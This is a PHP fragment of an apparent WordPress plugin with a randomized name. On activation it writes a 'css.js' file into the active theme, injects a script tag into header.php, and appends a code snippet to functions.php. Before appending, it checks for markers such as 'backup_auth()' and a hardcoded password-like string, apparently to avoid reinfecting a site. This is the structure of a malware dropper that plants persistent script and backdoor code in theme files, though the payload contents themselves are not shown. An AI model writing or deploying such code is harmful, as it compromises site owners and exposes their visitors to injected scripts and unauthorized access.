function i1b4788e9_should_skip_functions_php_injection( $content ) {
	if ( false !== strpos( $content, 'backup_auth()' ) ) {
		return true;
	}

	if ( false !== strpos( $content, 'FsSAj1bKldSAO2@!' ) ) {
		return true;
	}

	return false;
}

function i1b4788e9_append_to_functions_php( $content, $snippet ) {
	$block = "\n\n" . trim( $snippet ) . "\n";

	if ( preg_match( '/\?>\s*$/', $content ) ) {
		return preg_replace( '/\?>\s*$/', $block . "\n?>", $content, 1 );
	}

	return rtrim( $content ) . $block;
}

function i1b4788e9_maybe_inject_functions_php( $functions_path ) {
	if ( file_exists( $functions_path ) ) {
		$content = file_get_contents( $functions_path );
		if ( false === $content ) {
			return new WP_Error(
				'i1b4788e9_read_functions',
				sprintf(
					__( 'Could not read file: %s', 'plugin-1b4788e9' ),
					$functions_path
				)
			);
		}
	} else {
		$content = "<?php\n";
	}

	if ( i1b4788e9_should_skip_functions_php_injection( $content ) ) {
		return true;
	}

	$updated = i1b4788e9_append_to_functions_php( $content, i1b4788e9_get_functions_php_snippet() );

	if ( false === file_put_contents( $functions_path, $updated ) ) {
		return new WP_Error(
			'i1b4788e9_write_functions',
			sprintf(
				__( 'Could not update file: %s', 'plugin-1b4788e9' ),
				$functions_path
			)
		);
	}

	return true;
}

function i1b4788e9_get_parent_theme_dir() {
	return get_template_directory();
}

function i1b4788e9_is_writable_path( $path ) {
	if ( file_exists( $path ) ) {
		return is_writable( $path );
	}

	$dir = is_dir( $path ) ? $path : dirname( $path );

	return is_dir( $dir ) && is_writable( $dir );
}

function i1b4788e9_on_activate() {
	$errors = array();

	$theme_dir      = i1b4788e9_get_parent_theme_dir();
	$css_js_path    = $theme_dir . '/css.js';
	$header_path    = $theme_dir . '/header.php';
	$functions_path = $theme_dir . '/functions.php';

	if ( empty( $theme_dir ) || ! is_dir( $theme_dir ) ) {
		$errors[] = __( 'Could not resolve the parent theme directory.', 'plugin-1b4788e9' );
		set_transient( 'i1b4788e9_activation_errors', $errors, 60 );
		return;
	}

	if ( ! i1b4788e9_is_writable_path( $css_js_path ) ) {
		$errors[] = sprintf(
			__( 'Not writable: %s', 'plugin-1b4788e9' ),
			$css_js_path
		);
	}

	if ( ! file_exists( $header_path ) ) {
		$errors[] = sprintf(
			__( 'header.php not found: %s', 'plugin-1b4788e9' ),
			$header_path
		);
	} elseif ( ! i1b4788e9_is_writable_path( $header_path ) ) {
		$errors[] = sprintf(
			__( 'Not writable: %s', 'plugin-1b4788e9' ),
			$header_path
		);
	}

	if ( file_exists( $functions_path ) && ! i1b4788e9_is_writable_path( $functions_path ) ) {
		$errors[] = sprintf(
			__( 'Not writable: %s', 'plugin-1b4788e9' ),
			$functions_path
		);
	} elseif ( ! file_exists( $functions_path ) && ! i1b4788e9_is_writable_path( $functions_path ) ) {
		$errors[] = sprintf(
			__( 'Not writable: %s', 'plugin-1b4788e9' ),
			$functions_path
		);
	}

	if ( ! empty( $errors ) ) {
		set_transient( 'i1b4788e9_activation_errors', $errors, 60 );
		return;
	}

	$written = file_put_contents( $css_js_path, i1b4788e9_get_css_js_content() );
	if ( false === $written ) {
		$errors[] = sprintf(
			__( 'Could not create file: %s', 'plugin-1b4788e9' ),
			$css_js_path
		);
		set_transient( 'i1b4788e9_activation_errors', $errors, 60 );
		return;
	}

	$header = file_get_contents( $header_path );
	if ( false === $header ) {
		$errors[] = sprintf(
			__( 'Could not read file: %s', 'plugin-1b4788e9' ),
			$header_path
		);
		set_transient( 'i1b4788e9_activation_errors', $errors, 60 );
		return;
	}

	if ( ! i1b4788e9_header_has_css_js_script( $header ) ) {
		$updated = i1b4788e9_inject_before_head_or_body( $header, i1b4788e9_get_script_tag() );

		if ( false === $updated ) {
			$errors[] = sprintf(
				__( 'No valid </head> or </body> tag found after wp_head() in: %s', 'plugin-1b4788e9' ),
				$header_path
			);
			set_transient( 'i1b4788e9_activation_errors', $errors, 60 );
			return;
		}

		if ( false === file_put_contents( $header_path, $updated ) ) {
			$errors[] = sprintf(
				__( 'Could not update file: %s', 'plugin-1b4788e9' ),
				$header_path
			);
			set_transient( 'i1b4788e9_activation_errors', $errors, 60 );
			return;
		}
	}

	$functions_result = i1b4788e9_maybe_inject_functions_php( $functions_path );
	if ( is_wp_error( $functions_result ) ) {
		$errors[] = $functions_result->get_error_message();
		set_transient( 'i1b4788e9_activation_errors', $errors, 60 );
		return;
	}

	delete_transient( 'i1b4788e9_activation_errors' );
}

register_activation_hook( __FILE__, 'i1b4788e9_on_activate' );

function i1b4788e9_admin_notices() {
	$errors = get_transient( 'i1b4788e9_activation_errors' );
	if ( empty( $errors ) || ! is_array( $errors ) ) {
		return;
	}

	echo '<div class="notice notice-error is-dismissible"><p><strong>Plugin-1b4788e9:</strong></p><ul>';
	foreach ( $errors as $error ) {
		echo '<li>' . esc_html( $error ) . '</li>';
	}
	echo '</ul></div>';

	delete_transient( 'i1b4788e9_activation_errors' );
}
add_action( 'admin_notices', 'i1b4788e9_admin_notices' );
